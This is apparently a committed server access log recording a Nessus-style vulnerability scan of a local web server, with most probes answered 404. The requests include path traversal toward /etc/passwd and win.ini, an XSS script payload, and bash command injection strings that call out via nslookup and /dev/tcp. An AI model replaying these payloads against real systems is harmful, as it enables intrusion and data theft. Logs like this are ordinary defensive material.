+INFO:     192.168.31.2:37034 - "GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44290 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44304 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     192.168.31.2:44314 - "GET /././.. HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44330 - "GET ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44344 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44356 - "GET /1756331597-mongoose_trailing_slash_disclosure.nasl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44368 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44372 - "GET /version HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44386 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44398 - "GET /.%252e/.%252e/.%252e/.%252e/windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44404 - "GET /.%252e/.%252e/.%252e/.%252e/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44408 - "GET /.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44416 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44418 - "GET /search?NS-query-pat=..\..\..\..\..\..\..\..\winnt\win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44420 - "GET /search?NS-query-pat=../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44432 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44436 - "GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44450 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44462 - "GET /status.xsl. HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44476 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44480 - "GET /q5Z2om4y5ajj HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44486 - "PUT /q5Z2om4y5ajj HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44496 - "GET /q5Z2om4y5ajj HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44506 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44520 - "POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44536 - "POST /glpi/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44538 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44554 - "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44560 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44574 - "POST /FormHandler.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44584 - "GET /cgi-bin/faqmanager.cgi?toc=/etc/passwd%00 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44598 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44602 - "POST http%3A//127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44616 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44622 - "GET /DB4Web/INMU01VSTLSCAN-P01%3A23/foo HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44626 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44632 - "GET /WebInterface HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44634 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44650 - "GET /WebInterface/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44660 - "GET /CFIDE/administrator/index.cfm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44662 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44672 - "GET /backend/settings/oauth_adfs?hostname=192.168.8.229 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44686 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44688 - "GET /cwhp/XmpFileDownloadServlet?parameterName=downloadDoc&downloadDirectory=..\..\..\Windows\System32\drivers\etc\&readmeText=1 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44692 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44700 - "GET /dev/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44716 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44720 - "GET /axis/DirectDownload.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44730 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44736 - "GET /gui/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44750 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44756 - "GET /gui/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44760 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44774 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44784 - "GET /_mt/mt.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44794 - "GET /admin.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44798 - "GET /administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44814 - "GET /buglist.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44826 - "GET /cgi/mid.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44838 - "GET /cgi-bin/admin HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44848 - "GET /cgi-bin/admin.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44852 - "GET /cgi-bin/admin.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44862 - "GET /cgi-bin/administrator HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44868 - "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44876 - "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44892 - "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44908 - "GET /cgi-bin/cart.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44924 - "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44934 - "GET /cgi-bin/count.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44940 - "GET /cgi-bin/Count.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44944 - "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44958 - "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44960 - "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44976 - "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44984 - "GET /cgi-bin/help.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44990 - "GET /cgi-bin/hi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44992 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44996 - "GET /cgi-bin/index.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45010 - "GET /cgi-bin/index.sh HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45014 - "GET /cgi-bin/login.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45016 - "GET /cgi-bin/mailit.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45022 - "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45026 - "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45036 - "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45050 - "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45054 - "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45064 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45074 - "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45086 - "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45098 - "GET /cgi-bin/search HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45100 - "GET /cgi-bin/search.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45108 - "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45118 - "GET /cgi-bin/status HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45128 - "GET /cgi-bin/status.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45130 - "GET /cgi-bin/test.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45136 - "GET /cgi-bin/test.sh HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45142 - "GET /cgi-bin/test-cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45144 - "GET /cgi-bin/upload.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45152 - "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45166 - "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45180 - "GET /cgi-bin/wa HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45190 - "GET /cgi-bin/wa.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45198 - "GET /cgi-bin/wa.exe HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45214 - "GET /cgi-bin/whois.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45222 - "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45224 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45228 - "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45242 - "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45248 - "GET /index.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45252 - "GET /index.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45264 - "GET /index.sh HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45278 - "GET /nph-mr.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45294 - "GET /query.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45306 - "GET /session_login.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45310 - "GET /show_bug.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45312 - "GET /test HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45322 - "GET /test.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45338 - "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45348 - "GET /whois.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45352 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45356 - "GET /wwwadmin.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45372 - "GET /wwwboard.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45378 - "GET /xampp/cgi.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53220 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53222 - "POST /cgi-bin/file_transfer.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53238 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53246 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53252 - "GET /_mt/mt.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53264 - "GET /admin.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53270 - "GET /administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53286 - "GET /buglist.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53290 - "GET /cgi/mid.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53302 - "GET /cgi-bin/admin HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53308 - "GET /cgi-bin/admin.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53314 - "GET /cgi-bin/admin.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53328 - "GET /cgi-bin/administrator HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53340 - "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53356 - "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53364 - "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53372 - "GET /cgi-bin/cart.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53378 - "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53382 - "GET /cgi-bin/count.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53394 - "GET /cgi-bin/Count.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53402 - "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53410 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53424 - "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53432 - "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53448 - "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53460 - "GET /logon?onok=%22%3e%3cscript%3ealert%28%27axon_logon_xss.nasl%27%29%3c%2fscript%3e HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53476 - "GET /cgi-bin/help.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53484 - "GET /cgi-bin/hi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53486 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53492 - "GET /cgi-bin/index.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53508 - "GET /cgi-bin/index.sh HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53524 - "GET /cgi-bin/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53538 - "GET /cgi-bin/login.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53548 - "GET /cgi-bin/mailit.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53552 - "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53560 - "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53574 - "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53580 - "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53594 - "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53604 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53618 - "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53626 - "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53640 - "GET /cgi-bin/search HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53642 - "GET /cgi-bin/search.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53656 - "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53666 - "GET /cgi-bin/status HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53680 - "GET /cgi-bin/status.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53692 - "GET /cgi-bin/test.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53698 - "GET /cgi-bin/test.sh HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53700 - "GET /cgi-bin/test-cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53708 - "GET /cgi-bin/upload.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53712 - "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53716 - "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53728 - "GET /cgi-bin/wa HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53742 - "GET /cgi-bin/wa.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53746 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53752 - "GET /cgi-bin/wa.exe HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53762 - "GET /cgi-bin/whois.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53774 - "GET /error_page.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53776 - "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53786 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53794 - "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53804 - "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53814 - "GET /index.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53816 - "GET /index.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53820 - "GET /index.sh HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53822 - "GET /nph-mr.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53828 - "GET /query.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53842 - "GET /session_login.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53854 - "GET /show_bug.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53866 - "GET /test HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53872 - "GET /test.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53884 - "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53888 - "GET /whois.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53896 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53898 - "GET /wwwadmin.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53906 - "GET /wwwboard.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53910 - "GET /xampp/cgi.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53920 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53928 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53944 - "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53948 - "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53964 - "GET /..%5Cpixfir~1%5Chow_to_login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53978 - "GET /SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:54000 - "GET /trace.axd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:54002 - "GET /global.asa HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:54006 - "GET / HTTP/1.0" 200 OK
+INFO:     192.168.31.2:54010 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:54012 - "GET /index.jsp%00x HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:54014 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:54026 - "GET /user_settings.cfg HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:38368 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:38384 - "GET /rails_info/properties HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:38390 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:38398 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:38436 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:38452 - "GET /api/getServices?name[]=$(/bin/bash%20-c%20%22nslookup%20log4shell-generic-eNYXpxQT5LfknPZIcIUhten.w.nessus.org) HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:34426 - "GET /api/getServices?name[]=$(bash%20-c%20%22echo%20exploited_port[8080]by_nessus%20%3E/dev/tcp/192.168.31.2/38133") HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     127.0.0.1:52416 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52416 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52418 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52418 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44836 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54476 - "GET / HTTP/1.1" 200 OK
